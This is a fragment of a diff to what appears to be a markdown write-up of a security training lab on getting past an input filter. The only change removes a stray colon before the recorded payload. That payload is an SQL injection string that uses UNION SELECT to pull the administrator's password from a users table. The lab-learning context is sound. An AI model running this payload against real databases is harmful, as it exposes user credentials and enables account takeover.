@@ -34,7 +34,7 @@ The goal of this lab is to exploit the filter by crafting a payload that bypasse
 
 ## 📦 Payload Used
 
-**Injected Payload:** : 1 UNION SELECT password from users where username ='administrator'--
+**Injected Payload:**  1 UNION SELECT password from users where username ='administrator'--
 
  ---
  
